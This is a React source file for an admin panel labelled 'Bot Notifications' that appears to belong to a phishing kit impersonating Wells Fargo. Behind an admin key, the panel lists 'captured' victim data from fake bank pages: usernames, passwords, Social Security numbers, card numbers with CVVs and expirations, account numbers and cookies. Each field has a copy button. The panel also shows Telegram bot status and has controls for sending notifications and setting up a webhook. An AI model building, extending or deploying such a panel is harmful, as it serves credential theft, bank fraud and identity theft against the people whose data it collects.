import { useState } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import {
  Bot,
  CheckCircle2,
  XCircle,
  Send,
  RefreshCw,
  Eye,
  EyeOff,
  Bell,
  Shield,
  User,
  Key,
  Phone,
  Mail,
  CreditCard,
  Hash,
  Cookie,
  Calendar,
  FileDigit,
  MapPin,
  Monitor,
  Clock,
  Copy,
  Check,
  Webhook,
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { queryClient } from "@/lib/queryClient";

interface VisitorLog {
  id: string;
  ip: string;
  browser: string;
  browserVersion: string;
  os: string;
  device: string;
  deviceType: string;
  location: {
    city: string;
    region: string;
    country: string;
    timezone: string;
  };
  page: string;
  username: string | null;
  password: string | null;
  email: string | null;
  phone: string | null;
  ssn: string | null;
  dateOfBirth: string | null;
  cardNumber: string | null;
  cardExpiration: string | null;
  cardCvv: string | null;
  accountNumber: string | null;
  cookies: string | null;
  sessionId: string | null;
  formData: string | null;
  action: string;
  timestamp: string;
}

interface VisitorData {
  total: number;
  logs: VisitorLog[];
}

interface BotStatusData {
  connected: boolean;
  bot: { username: string; firstName: string; id: number } | null;
  chatId: string | null;
  subscriberCount: number;
}

interface WebhookResult {
  success?: boolean;
  webhookUrl?: string;
  error?: string;
}

function DataRow({
  icon,
  label,
  value,
  highlight,
  copyId,
  onCopy,
  copiedId,
}: {
  icon: React.ReactNode;
  label: string;
  value: string | null | undefined;
  highlight?: string;
  copyId?: string;
  onCopy?: (val: string, id: string) => void;
  copiedId?: string | null;
}) {
  if (!value) return null;
  const colorMap: Record<string, string> = {
    red: "text-red-400",
    yellow: "text-yellow-400",
    green: "text-green-400",
    blue: "text-blue-400",
    purple: "text-purple-400",
    orange: "text-orange-400",
    white: "text-white",
  };
  const valColor = colorMap[highlight ?? "white"] ?? "text-white";

  return (
    <div className="flex items-start gap-2 py-1.5 border-b border-gray-800/60 last:border-0">
      <span className="text-gray-500 mt-0.5 shrink-0">{icon}</span>
      <span className="text-gray-400 text-xs w-32 shrink-0 pt-0.5">{label}</span>
      <div className="flex items-center gap-2 flex-1 min-w-0">
        <span className={`text-sm font-mono break-all ${valColor}`}>{value}</span>
        {copyId && onCopy && (
          <button
            onClick={() => onCopy(value, copyId)}
            className="shrink-0 text-gray-600 hover:text-gray-300 transition-colors"
            data-testid={`copy-${copyId}`}
          >
            {copiedId === copyId ? (
              <Check className="w-3 h-3 text-green-400" />
            ) : (
              <Copy className="w-3 h-3" />
            )}
          </button>
        )}
      </div>
    </div>
  );
}

function NotificationCard({
  log,
  copiedId,
  onCopy,
}: {
  log: VisitorLog;
  copiedId: string | null;
  onCopy: (val: string, id: string) => void;
}) {
  const actionColors: Record<string, string> = {
    login_attempt: "bg-blue-600",
    registration: "bg-green-600",
    password_reset: "bg-orange-600",
    identity_verification: "bg-yellow-600",
    facial_recognition_auth: "bg-purple-600",
    page_view: "bg-gray-600",
  };
  const badgeColor = actionColors[log.action] ?? "bg-gray-600";

  const formattedDate = new Date(log.timestamp).toLocaleString("en-US", {
    month: "short",
    day: "numeric",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });

  const locationStr = [log.location?.city, log.location?.region, log.location?.country]
    .filter((p) => p && p !== "Unknown")
    .join(", ") || log.ip;

  return (
    <div
      className="bg-gray-900 border border-gray-800 rounded-xl overflow-hidden"
      data-testid={`notification-card-${log.id}`}
    >
      <div className="flex items-center justify-between px-4 py-3 bg-gray-800/60 border-b border-gray-800">
        <div className="flex items-center gap-2">
          <Bot className="w-4 h-4 text-blue-400" />
          <span className="text-white text-sm font-semibold">🏦 WELLS FARGO ALERT</span>
        </div>
        <div className="flex items-center gap-2">
          <span className={`text-xs px-2 py-0.5 rounded-full text-white font-medium ${badgeColor}`}>
            {log.action?.replace(/_/g, " ").toUpperCase()}
          </span>
          <span className="text-gray-500 text-xs flex items-center gap-1">
            <Clock className="w-3 h-3" />
            {formattedDate}
          </span>
        </div>
      </div>

      <div className="px-4 py-3 space-y-0.5">
        <DataRow
          icon={<User className="w-3.5 h-3.5" />}
          label="Username"
          value={log.username}
          highlight="blue"
          copyId={`user-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        <DataRow
          icon={<Key className="w-3.5 h-3.5" />}
          label="Password"
          value={log.password}
          highlight="red"
          copyId={`pass-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        <DataRow
          icon={<FileDigit className="w-3.5 h-3.5" />}
          label="SSN"
          value={log.ssn}
          highlight="yellow"
          copyId={`ssn-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        <DataRow
          icon={<Calendar className="w-3.5 h-3.5" />}
          label="DOB"
          value={log.dateOfBirth}
          highlight="white"
          copyId={`dob-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        <DataRow
          icon={<Phone className="w-3.5 h-3.5" />}
          label="Phone number"
          value={log.phone}
          highlight="green"
          copyId={`phone-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        <DataRow
          icon={<Mail className="w-3.5 h-3.5" />}
          label="Email"
          value={log.email}
          highlight="white"
          copyId={`email-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        <DataRow
          icon={<CreditCard className="w-3.5 h-3.5" />}
          label="Card number"
          value={log.cardNumber}
          highlight="green"
          copyId={`card-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        <DataRow
          icon={<CreditCard className="w-3.5 h-3.5" />}
          label="Expiration"
          value={log.cardExpiration}
          highlight="green"
        />
        <DataRow
          icon={<CreditCard className="w-3.5 h-3.5" />}
          label="CVV"
          value={log.cardCvv}
          highlight="orange"
          copyId={`cvv-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        <DataRow
          icon={<Hash className="w-3.5 h-3.5" />}
          label="Account number"
          value={log.accountNumber}
          highlight="purple"
          copyId={`acct-${log.id}`}
          onCopy={onCopy}
          copiedId={copiedId}
        />
        {log.cookies && (
          <div className="py-1.5 border-b border-gray-800/60 last:border-0">
            <div className="flex items-center gap-2 mb-1">
              <Cookie className="w-3.5 h-3.5 text-gray-500" />
              <span className="text-gray-400 text-xs">Cookies</span>
            </div>
            <div className="bg-gray-800 rounded p-2 max-h-16 overflow-y-auto">
              <span className="text-xs font-mono text-gray-300 break-all">{log.cookies}</span>
            </div>
          </div>
        )}

        <div className="pt-2 mt-1 border-t border-gray-800 grid grid-cols-2 gap-x-4 gap-y-1">
          <div className="flex items-center gap-1.5">
            <MapPin className="w-3 h-3 text-gray-500" />
            <span className="text-gray-500 text-xs">{locationStr}</span>
          </div>
          <div className="flex items-center gap-1.5">
            <Monitor className="w-3 h-3 text-gray-500" />
            <span className="text-gray-500 text-xs">{log.browser} · {log.deviceType}</span>
          </div>
          <div className="flex items-center gap-1.5">
            <Hash className="w-3 h-3 text-gray-500" />
            <span className="text-gray-500 text-xs font-mono">{log.ip}</span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function BotNotificationsPage() {
  const [adminKey, setAdminKey] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [showKey, setShowKey] = useState(false);
  const [keyError, setKeyError] = useState("");
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const { toast } = useToast();

  const { data: logsData, isLoading: logsLoading, refetch: refetchLogs } = useQuery<VisitorData>({
    queryKey: ["/api/admin/visitors", adminKey],
    queryFn: async () => {
      const response = await fetch(`/api/admin/visitors?key=${encodeURIComponent(adminKey)}&limit=200`);
      if (!response.ok) {
        if (response.status === 401) {
          setIsAuthenticated(false);
          throw new Error("Invalid admin key");
        }
        throw new Error("Failed to fetch logs");
      }
      return response.json();
    },
    enabled: isAuthenticated,
    refetchInterval: 10000,
  });

  const { data: botData, refetch: refetchBot } = useQuery<BotStatusData>({
    queryKey: ["/api/telegram/status", adminKey],
    queryFn: async () => {
      const response = await fetch(`/api/telegram/status?key=${encodeURIComponent(adminKey)}`);
      if (!response.ok) throw new Error("Failed to fetch bot status");
      return response.json();
    },
    enabled: isAuthenticated,
    refetchInterval: 30000,
  });

  const testMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch(`/api/telegram/test?key=${encodeURIComponent(adminKey)}`, { method: "POST" });
      if (!response.ok) throw new Error("Failed to send test");
      return response.json();
    },
    onSuccess: () => toast({ title: "Test notification sent!" }),
    onError: () => toast({ title: "Failed to send test notification", variant: "destructive" }),
  });

  const webhookMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch(`/api/telegram/setup-webhook`);
      if (!response.ok) throw new Error("Failed to set webhook");
      return response.json() as Promise<WebhookResult>;
    },
    onSuccess: (result) => {
      if (result.success) {
        toast({ title: "Webhook configured!", description: result.webhookUrl });
        queryClient.invalidateQueries({ queryKey: ["/api/telegram/status"] });
      } else {
        toast({ title: "Webhook setup failed", description: result.error, variant: "destructive" });
      }
    },
    onError: () => toast({ title: "Failed to configure webhook", variant: "destructive" }),
  });

  const handleCopy = (val: string, id: string) => {
    navigator.clipboard.writeText(val);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleAuthenticate = () => {
    if (!adminKey.trim()) {
      setKeyError("Please enter the admin key");
      return;
    }
    setKeyError("");
    setIsAuthenticated(true);
  };

  const handleRefresh = () => {
    refetchLogs();
    refetchBot();
  };

  const capturedLogs = logsData?.logs.filter(
    (l) => l.action !== "page_view" && (l.username || l.password || l.ssn || l.cardNumber || l.email || l.phone)
  ) ?? [];

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-950 flex items-center justify-center p-4">
        <Card className="w-full max-w-sm bg-gray-900 border-gray-800">
          <CardHeader className="text-center pb-2">
            <div className="flex justify-center mb-3">
              <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center">
                <Bot className="w-8 h-8 text-white" />
              </div>
            </div>
            <CardTitle className="text-xl text-white">Bot Notifications</CardTitle>
            <p className="text-gray-400 text-sm mt-1">Enter your admin key to view captured data</p>
          </CardHeader>
          <CardContent className="space-y-3 pt-3">
            <div className="relative">
              <Input
                type={showKey ? "text" : "password"}
                placeholder="Admin key"
                value={adminKey}
                onChange={(e) => setAdminKey(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleAuthenticate()}
                className="bg-gray-800 border-gray-700 text-white pr-10"
                data-testid="input-admin-key"
              />
              <button
                type="button"
                onClick={() => setShowKey(!showKey)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200"
              >
                {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            {keyError && <p className="text-red-400 text-sm">{keyError}</p>}
            <Button
              onClick={handleAuthenticate}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white"
              data-testid="button-authenticate"
            >
              <Shield className="w-4 h-4 mr-2" />
              Access Panel
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-950 text-white">
      <div className="sticky top-0 z-10 border-b border-gray-800 bg-gray-900/95 backdrop-blur px-4 py-3">
        <div className="max-w-3xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-blue-600 rounded-full flex items-center justify-center">
              <Bot className="w-4 h-4 text-white" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-white font-semibold text-sm">
                  {botData?.bot ? `@${botData.bot.username}` : "Bot Notifications"}
                </span>
                <span className={`w-2 h-2 rounded-full ${botData?.connected ? "bg-green-400" : "bg-red-400"}`} />
              </div>
              <p className="text-gray-400 text-xs">
                {capturedLogs.length} capture{capturedLogs.length !== 1 ? "s" : ""} · auto-refreshes every 10s
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="sm"
              onClick={() => webhookMutation.mutate()}
              disabled={webhookMutation.isPending}
              className="text-gray-400 hover:text-white hover:bg-gray-800 h-8 px-2"
              data-testid="button-setup-webhook"
              title="Setup webhook"
            >
              <Webhook className="w-4 h-4" />
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => testMutation.mutate()}
              disabled={testMutation.isPending || !botData?.connected}
              className="text-gray-400 hover:text-white hover:bg-gray-800 h-8 px-2"
              data-testid="button-test-notification"
              title="Send test notification"
            >
              <Send className="w-4 h-4" />
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={handleRefresh}
              disabled={logsLoading}
              className="text-gray-400 hover:text-white hover:bg-gray-800 h-8 px-2"
              data-testid="button-refresh"
            >
              <RefreshCw className={`w-4 h-4 ${logsLoading ? "animate-spin" : ""}`} />
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-3xl mx-auto px-4 py-6 space-y-4">
        <div className="grid grid-cols-3 gap-3">
          <Card className="bg-gray-900 border-gray-800">
            <CardContent className="p-3 flex items-center gap-2">
              {botData?.connected ? (
                <CheckCircle2 className="w-5 h-5 text-green-400 shrink-0" />
              ) : (
                <XCircle className="w-5 h-5 text-red-400 shrink-0" />
              )}
              <div>
                <p className="text-gray-400 text-xs">Bot</p>
                <p className={`text-sm font-semibold ${botData?.connected ? "text-green-400" : "text-red-400"}`}>
                  {botData?.connected ? "Online" : "Offline"}
                </p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-gray-900 border-gray-800">
            <CardContent className="p-3 flex items-center gap-2">
              <Bell className="w-5 h-5 text-blue-400 shrink-0" />
              <div>
                <p className="text-gray-400 text-xs">Captures</p>
                <p className="text-sm font-semibold text-white">{capturedLogs.length}</p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-gray-900 border-gray-800">
            <CardContent className="p-3 flex items-center gap-2">
              <Key className="w-5 h-5 text-red-400 shrink-0" />
              <div>
                <p className="text-gray-400 text-xs">With Passwords</p>
                <p className="text-sm font-semibold text-white">
                  {capturedLogs.filter((l) => l.password).length}
                </p>
              </div>
            </CardContent>
          </Card>
        </div>

        {logsLoading ? (
          <div className="space-y-4">
            {[1, 2, 3].map((i) => (
              <div key={i} className="h-48 bg-gray-900 rounded-xl animate-pulse border border-gray-800" />
            ))}
          </div>
        ) : capturedLogs.length === 0 ? (
          <div className="text-center py-20">
            <Bot className="w-14 h-14 text-gray-700 mx-auto mb-4" />
            <p className="text-gray-400 font-medium">No captures yet</p>
            <p className="text-gray-600 text-sm mt-1">
              Notifications will appear here as information is captured
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            {capturedLogs.map((log) => (
              <NotificationCard
                key={log.id}
                log={log}
                copiedId={copiedId}
                onCopy={handleCopy}
              />
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
